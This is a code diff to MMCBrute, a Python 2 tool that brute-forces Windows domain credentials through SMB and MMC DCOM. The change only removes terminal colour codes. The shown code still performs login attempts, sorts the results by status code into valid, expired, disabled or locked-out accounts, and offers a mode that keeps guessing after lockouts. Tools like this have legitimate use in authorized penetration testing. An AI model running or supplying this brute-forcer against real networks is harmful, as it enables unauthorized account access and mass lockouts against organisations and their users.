@@ -101,61 +101,61 @@ class MMCBrute(object):
 		try:
 			# This line will always raise an exception unless the credentials can initiate an smb connection
 			smb_connection.login(username, password, domain)
-			self.log.info("\033[92m[+] Success (Account Active) {0}\033[0m".format(attempt))
+			self.log.info("[+] Success (Account Active) {0}".format(attempt))
 			return True
 
 		except Exception as msg:
 			msg = str(msg)
 			if 'STATUS_NO_LOGON_SERVERS' in msg:
-				self.log.info('\033[93m[-] No Logon Servers Available\033[0m')
+				self.log.info('[-] No Logon Servers Available')
 				sys.exit(os.EX_SOFTWARE)
 
 			elif 'STATUS_LOGON_FAILURE' in msg:
 				if self.verbose:
-					self.log.info("\033[91m[-] Failed {0}\033[0m".format(attempt))
+					self.log.info("[-] Failed {0}".format(attempt))
 				return False
 
 			elif 'STATUS_ACCOUNT_LOCKED_OUT' in msg:
-				print "\033[93m[-] Account Locked Out {0}\033[0m".format(attempt)
+				print "[-] Account Locked Out {0}".format(attempt)
 				if not self.honeybadger:
 					self.log.info(
-						'\033[94m[!] Honey Badger mode not enabled. Halting to prevent further lockouts..\033[0m')
-					answer = str(raw_input('\033[94m[!] Would you like to proceed with the bruteforce? (Y/N) '))
+						'[!] Honey Badger mode not enabled. Halting to prevent further lockouts..')
+					answer = str(raw_input('[!] Would you like to proceed with the bruteforce? (Y/N) '))
                                         if answer.lower() in ["y", "yes", ""]:
-                                                self.log.info('\033[93m[*] Resuming...')
+                                                self.log.info('[*] Resuming...')
                                                 return False
                                         else:
-                                             	self.log.info('\033[91m[-]Exiting...')
+                                             	self.log.info('[-]Exiting...')
                                                 sys.exit(os.EX_SOFTWARE)
 
 			elif 'STATUS_PASSWORD_MUST_CHANGE' in msg:
-				self.log.info("\033[92m[+] Success (User never logged in to change password) {0}\033[0m".format(attempt))
+				self.log.info("[+] Success (User never logged in to change password) {0}".format(attempt))
 
 			elif 'STATUS_ACCESS_DENIED' in msg or 'STATUS_LOGON_TYPE_NOT_GRANTED' in msg:
-				self.log.info("\033[92m[+] Success (Account Active) {0}\033[0m".format(attempt))
+				self.log.info("[+] Success (Account Active) {0}".format(attempt))
 
 			elif 'STATUS_PASSWORD_EXPIRED' in msg:
-				self.log.info("\033[92m[+] Success (Password Expired) {0}\033[0m".format(attempt))
+				self.log.info("[+] Success (Password Expired) {0}".format(attempt))
 
 			elif 'STATUS_ACCOUNT_DISABLED' in msg:
-				self.log.info("\033[91m[-] Valid Password (Account Disabled) {0}\033[0m".format(attempt))
+				self.log.info("[-] Valid Password (Account Disabled) {0}".format(attempt))
 
 			else:
-				self.log.info("\033[91m[-] Unknown error: {0}\t{1}\033[0m".format(msg, attempt))
+				self.log.info("[-] Unknown error: {0}\t{1}".format(msg, attempt))
 			return True
 
 	def end(self):
-		self.log.info("\033[94m\nEnded at:\t\t{0:%I:%M %p on %B %d, %Y}\033[0m\n".format(datetime.datetime.now()))
+		self.log.info("\nEnded at:\t\t{0:%I:%M %p on %B %d, %Y}\n".format(datetime.datetime.now()))
 
 	def info(self):
-		self.log.info("\033[94mTarget:\t\t\t{0}".format(self.target))
+		self.log.info("Target:\t\t\t{0}".format(self.target))
 		self.log.info("Username count:\t\t{0}".format(self.len_usernames))
 		self.log.info("Password count:\t\t{0}".format(self.len_passwords))
 		self.log.info("Estimated attempts:\t{0}".format(self.totals))
 		self.log.info("User-as-Pass Mode:\t{0!r}".format(self.user_as_pass))
 		self.log.info("Honey Badger Mode:\t{0!r}".format(self.honeybadger))
 		self.log.info("Verbose:\t\t{0!r}".format(self.verbose))
-		self.log.info("Time:\t\t\t{0:%I:%M %p on %B %d, %Y}\033[0m\n".format(datetime.datetime.now()))
+		self.log.info("Time:\t\t\t{0:%I:%M %p on %B %d, %Y}\n".format(datetime.datetime.now()))
 
 if __name__ == '__main__':
 	parser = argparse.ArgumentParser(add_help=True, description='Use MMC DCOM to bruteforce valid credentials')
@@ -184,6 +184,6 @@ if __name__ == '__main__':
 		brute.info()
 		brute.run()
 	except KeyboardInterrupt:
-		print('\033[94m\n[*] Caught ctrl-c, exiting')
+		print('\n[*] Caught ctrl-c, exiting')
 	finally:
 		brute.end()
